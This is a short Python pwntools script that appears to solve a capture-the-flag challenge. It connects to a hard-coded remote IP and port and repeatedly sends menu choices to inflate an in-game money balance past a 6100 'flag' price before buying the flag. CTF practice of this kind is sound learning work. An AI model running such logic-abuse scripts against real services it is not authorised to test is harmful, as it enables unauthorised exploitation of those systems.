from pwn import *

p = remote("3.21.54.89",14432)

flag = 6100

print(p.recvuntil('Choice: '))
p.send(b"6\n")
print(p.recvuntil('Choice: '))

money = 80

while money <= flag:
    print(0)
    p.send(b"0\n")
    print(p.recvuntil('Choice: '))
    print(1)
    p.send(b"1\n")
    money += 20 
    print(p.recvuntil('Choice: '))
    print(money)
    

p.send(b"5\n")
print(p.recv(1024))

p.interactive()
